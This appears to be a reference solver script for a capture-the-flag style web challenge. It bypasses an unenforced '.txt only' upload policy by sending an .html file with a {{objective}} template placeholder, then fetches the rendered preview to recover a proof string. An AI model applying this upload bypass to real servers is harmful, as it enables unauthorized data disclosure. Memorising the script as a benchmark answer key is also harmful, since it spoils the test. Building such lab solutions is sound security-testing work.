#!/usr/bin/env python3
"""Reusable solver for 'Uploading Expectations' (upload content-type bypass
leading to server-side template field disclosure).

Usage:
    python3 solve.py start.json

Reads the single target URL from start.json's targets[] (id "Target 1"),
discovers the upload/preview routes from /api/clues, uploads a note whose
filename ends in .html (bypassing the stated ".txt only" policy, since the
server never actually enforces content_type/extension) containing the
{{objective}} placeholder, then fetches the rendered preview to recover the
proof string. Prints {"proof-1": "<proof>"} as JSON on stdout.

Only talks to the target origin given in start.json. Stdlib only.
"""
import json
import sys
import urllib.request
import http.cookiejar


def find_target(start, target_id="Target 1"):
    for t in start.get("targets", []):
        if t.get("id") == target_id:
            return t["url"].rstrip("/")
    # fall back to the only target if there's just one
    targets = start.get("targets", [])
    if len(targets) == 1:
        return targets[0]["url"].rstrip("/")
    raise SystemExit(f"could not find target {target_id!r} in start.json")


def make_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


UA = "Mozilla/5.0 (X11; Linux x86_64) web-worker-solve.py"


def get_json(opener, url, timeout=30):
    req = urllib.request.Request(url, headers={"user-agent": UA})
    with opener.open(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8", "replace"))


def post_json(opener, url, payload, timeout=30):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        url,
        data=data,
        headers={"content-type": "application/json", "user-agent": UA},
        method="POST",
    )
    with opener.open(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8", "replace"))


def get_text(opener, url, timeout=30):
    req = urllib.request.Request(url, headers={"user-agent": UA})
    with opener.open(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", "replace")


def solve(base_url):
    opener = make_opener()
    # establish session
    get_text(opener, base_url + "/")
    clues = get_json(opener, base_url + "/api/clues")
    upload_route = clues["feature_route"]
    render_route = clues["render_route"]

    # Policy claims only .txt/text/plain is accepted, but the server does not
    # enforce either the filename extension or the content_type field: send a
    # .html filename so the staff HTML preview path is used instead of the
    # plain-text path, and plant the {{objective}} placeholder it evaluates.
    upload = post_json(
        opener,
        base_url + upload_route,
        {
            "filename": "proof-recovery.html",
            "content": "{{objective}}",
            "content_type": "text/html",
        },
    )
    path = upload["path"]  # e.g. "/result-824c5b?file=proof-recovery.html"
    assert path.startswith(render_route), f"unexpected render path: {path}"

    rendered = get_text(opener, base_url + path).strip()
    return rendered


def main():
    if len(sys.argv) < 2:
        print("usage: solve.py start.json", file=sys.stderr)
        raise SystemExit(2)
    with open(sys.argv[1]) as f:
        start = json.load(f)
    base_url = find_target(start, "Target 1")
    proof = solve(base_url)
    print(json.dumps({"proof-1": proof}))


if __name__ == "__main__":
    main()
